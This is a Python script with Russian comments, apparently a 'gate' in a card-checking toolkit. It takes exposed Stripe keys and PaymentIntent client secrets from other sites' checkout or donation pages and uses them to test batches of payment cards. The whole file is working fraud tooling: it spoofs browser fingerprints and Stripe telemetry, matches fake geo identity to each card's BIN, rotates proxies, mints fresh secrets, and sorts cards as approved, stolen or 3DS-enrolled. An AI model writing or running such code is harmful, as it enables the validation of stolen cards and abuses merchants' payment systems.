# language: Python 3.12+, file: confirm_gate.py, target: Windows 11, deps: curl_cffi
# Sprint 3 (Фаза 2): PaymentIntent Confirm engine — ЛЮБОЙ сайт со Stripe checkout,
# не только WooCommerce. Один client_secret обслуживает пачку карт до лимита
# подтверждений; при исчерпании — mint нового (если эндпоинт найден).
import asyncio
import json
import os
import re
import sys
import time
from datetime import datetime

from curl_cffi.requests import AsyncSession

import config
import gate_client as gc

sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")

MAX_CONFIRMS_PER_SECRET = config.MAX_CONFIRMS_PER_SECRET


def err_result(card_raw: str, detail: str) -> dict:
    return {"card": card_raw, "status": "ERROR", "detail": detail, "retry_next_gate": True}


class ConfirmGateSession:
    """Сессия на одну checkout-страницу: pk + client_secret (+ mint-эндпоинты)."""

    def __init__(self, target_url: str, proxy: str | None = None,
                 max_amount_cents: int = config.MAX_PI_AMOUNT_CENTS):
        self.target = target_url.rstrip("/")
        self.proxy = proxy
        self.max_amount = max_amount_cents
        self.s: AsyncSession | None = None
        self.pk = ""
        self.secret = ""
        self.pi_info: dict | None = None
        self.mints: list[str] = []
        self.mint_idx = 0
        self.confirm_count = 0
        self.telem: dict | None = None
        self.charge_risk = False

    async def open(self) -> tuple[bool, str]:
        s = AsyncSession(impersonate="chrome131", verify=False, proxy=self.proxy)
        try:
            r = await s.get(self.target, timeout=15)
            if r.status_code != 200:
                await _close(s)
                return False, f"GET target HTTP {r.status_code}"
            html = r.text
            if gc.is_cloudflare_challenge(html):
                await _close(s)
                return False, "Cloudflare challenge on target page"

            self.pk = gc.extract_pk_live(html)
            secrets = gc.extract_client_secrets(html)
            if not self.pk or not secrets:
                await _close(s)
                return False, "pk_live or client_secret missing on page"

            self.mints = gc.detect_secret_mints(html, self.target)
            self.s = s

            # beacon-mint живых fingerprint-ID для телеметрии
            live_ids = {"muid": "", "sid": "", "guid": ""}
            try:
                r_m = await s.post("https://m.stripe.com/6",
                                   data=gc.m_stripe_beacon_payload(),
                                   headers={"Origin": "https://js.stripe.com",
                                            "Referer": "https://js.stripe.com/", "Accept": "*/*"},
                                   timeout=6)
                if r_m.status_code == 200:
                    live_ids = gc.parse_m_stripe_response(r_m.json())
            except Exception:
                pass
            self.telem = gc.stripe_telemetry(self.target, self.pk,
                                             muid=live_ids["muid"], sid=live_ids["sid"])
            if live_ids["guid"]:
                self.telem["guid"] = live_ids["guid"]

            ok, detail = await self._adopt_secret(secrets[0]["secret"])
            if not ok:
                await _close(s)
                return False, detail
            return True, ""
        except Exception as e:
            await _close(s)
            return False, f"{type(e).__name__}: {e}"

    async def _adopt_secret(self, secret: str) -> tuple[bool, str]:
        """Разведка PI перед боем: жив ли секрет и безопасна ли сумма."""
        info = await gc.stripe_retrieve_pi(self.s, self.pk, secret)
        if info is None:
            return False, "client_secret dead or retrieve failed"
        amount = int(info.get("amount") or 0)
        if info.get("status") != "requires_payment_method":
            return False, f"PI status={info.get('status')} — secret not reusable"
        self.charge_risk = amount > self.max_amount
        self.pi_info = info
        self.secret = secret
        self.confirm_count = 0
        risk = " [CHARGE_RISK!]" if self.charge_risk else ""
        print(f"    [i] PI adopted: {amount} {info.get('currency')} "
              f"capture={info.get('capture_method')}{risk}", flush=True)
        return True, ""

    async def _refresh_secret(self) -> bool:
        """Исчерпали/убили секрет → пробуем минтнуть новый с найденных эндпоинтов."""
        while self.mint_idx < len(self.mints):
            ep = self.mints[self.mint_idx]
            try:
                r = await self.s.post(ep, data={}, timeout=10)
                txt = r.text
                m = gc.RE_CLIENT_SECRET.search(txt)
                if m and await self._adopt_secret(m.group(1)):
                    print(f"    [+] Minted fresh secret via {ep}", flush=True)
                    return True
            except Exception:
                pass
            self.mint_idx += 1
        return False

    async def check_card(self, card_raw: str, bin_alpha2: str = "US") -> dict:
        card = gc.parse_card(card_raw)
        telem = dict(self.telem)
        if bin_alpha2 and bin_alpha2.upper() != (self.telem.get("country") or "US").upper():
            telem.update(gc.geo_identity_fields(bin_alpha2))
        tok_body = gc.tokenize_body(card, telem, self.target)
        try:
            r_tok = await self.s.post("https://api.stripe.com/v1/payment_methods",
                                      data=tok_body, headers=gc.TOKENIZE_HEADERS, timeout=10)
            tok_data = r_tok.json()
        except Exception as e:
            return {"card": card_raw, "status": "ERROR",
                    "detail": f"Stripe tokenize error: {e}", "retry_next_gate": False}
        if "id" not in tok_data:
            code = tok_data.get("error", {}).get("code", "tokenize_error")
            msg = tok_data.get("error", {}).get("message", "")
            return {"card": card_raw, "status": f"DECLINED@{code.upper()}",
                    "detail": msg, "retry_next_gate": False}
        pm_id = tok_data["id"]

        if self.confirm_count >= MAX_CONFIRMS_PER_SECRET:
            if not await self._refresh_secret():
                return {"card": card_raw, "status": "ERROR",
                        "detail": "confirm budget exhausted, no live mint endpoint",
                        "retry_next_gate": True}

        resp = await gc.stripe_confirm_pi(self.s, self.pk, self.secret, pm_id,
                                          self.target, telem)
        verdict, detail = gc.classify_pi_verdict(resp)

        if verdict in ("APPROVED@CVV", "APPROVED@CCN", "INVALID", "EXPIRED",
                       "DECLINED", "DECLINED@STOLEN", "DECLINED@FRAUD",
                       "DECLINED@DO_NOT_HONOR"):
            # карта отклонена — секрет остаётся живым (Sprint 2.5 retry loop)
            self.confirm_count += 1
            if not gc.pi_secret_alive(resp) and not await self._refresh_secret():
                pass  # следующий вызов упрётся в бюджет и вернёт ERROR
        elif verdict == "RETRY":
            return {"card": card_raw, "status": "RETRY",
                    "detail": detail, "retry_next_gate": True}

        if verdict == "3DS_REDIRECT" and detail:
            follow = await gc.stripe_3ds_follow_redirect(self.s, detail)
            low = (follow.get("html") or "").lower()
            if "succeeded" in low or "payment complete" in low or "thank you" in low:
                verdict, detail = "3DS_FRICTIONLESS_PASSED", follow.get("final_url", "")
            else:
                verdict, detail = "3DS_CHALLENGE", follow.get("final_url", "")

        if verdict == "3DS_REQUIRED":
            na = resp.get("next_action") or {}
            sdk = na.get("use_stripe_sdk") or {}
            src = sdk.get("source") or sdk.get("three_d_secure_source") or ""
            if src:
                ares = await gc.stripe_3ds2_authenticate(self.s, self.pk, src)
                ts = ares.get("transStatus")
                if ts == "Y":
                    verdict, detail = "3DS_FRICTIONLESS_PASSED", "transStatus=Y (no user step)"
                    # frictionless прошёл — PI мог перейти в succeeded
                    info = await gc.stripe_retrieve_pi(self.s, self.pk, self.secret)
                    if info and info.get("status") == "succeeded":
                        verdict, detail = "APPROVED", f"3DS2 frictionless -> {info}"
                elif ts == "C":
                    verdict, detail = "3DS_CHALLENGE", "карта жива, enrolled в 3DS (нужен OTP)"
                else:
                    verdict, detail = "3DS_FAILED", json.dumps(ares.get("raw"))[:150]

        return {"card": card_raw, "status": verdict, "detail": str(detail)[:250],
                "retry_next_gate": False}

    async def close(self):
        await _close(self.s)
        self.s = None


async def _close(s: AsyncSession | None):
    if s is None:
        return
    try:
        await s.close()
    except Exception:
        pass


async def main():
    raw_args = sys.argv[1:]
    explicit_proxy = None
    while "--proxy" in raw_args:
        i = raw_args.index("--proxy")
        if i + 1 < len(raw_args):
            explicit_proxy = raw_args[i + 1]
            del raw_args[i:i + 2]
    proxy_pool = gc.load_proxies()

    target = None
    cards = []
    for a in raw_args:
        if a.startswith("http") and target is None:
            target = a
        elif os.path.exists(a):
            with open(a, encoding="utf-8") as f:
                cards.extend([l.strip() for l in f if l.strip() and not l.startswith("#")])
        else:
            cards.append(a.strip())

    if not target:
        print("Usage: python confirm_gate.py <checkout-url> [--proxy URL] [cards...|file]")
        print("  target: страница с торчащим pk_live + pi_..._secret_... (donation/checkout)")
        return

    if not cards:
        probe = gc.gen_probe_card()
        cards = [f"{probe['number']}|{probe['mm']}|{probe['yy']}|{probe['cvc']}"]
        print(f"[*] No cards given — random Luhn-valid probe: {cards[0]}")

    print("=" * 80)
    print("[*] PAYMENTINTENT CONFIRM GATE ($0-risk auth via exposed client_secret)")
    print(f"[*] Target: {target}")
    print(f"[*] Cards: {len(cards)} | Proxy: {explicit_proxy or 'direct'}")
    print("=" * 80)

    gs = ConfirmGateSession(target, proxy=gc.pick_proxy(proxy_pool, explicit_proxy))
    ok, detail = await gs.open()
    if not ok:
        print(f"[x] Gate open FAILED: {detail}")
        await gs.close()
        return

    results = []
    try:
        for i, c in enumerate(cards):
            t0 = time.perf_counter()
            res = await gs.check_card(c)
            lat = int((time.perf_counter() - t0) * 1000)
            results.append(res)
            print(f">>> [{res['status']:24}] {gc.mask_pan(res['card'])} "
                  f"({lat}ms) -> {res['detail']}", flush=True)
            if i < len(cards) - 1:
                await asyncio.sleep(2)
    finally:
        await gs.close()

    print("\n" + "=" * 80)
    print("[*] SUMMARY:")
    for r in results:
        print(f"  {r['status']:26} {r['card']:30} {r['detail'][:80]}")
    print(f"[*] Confirms spent on current secret: {gs.confirm_count}/{MAX_CONFIRMS_PER_SECRET}")
    print("=" * 80)


if __name__ == "__main__":
    asyncio.run(main())
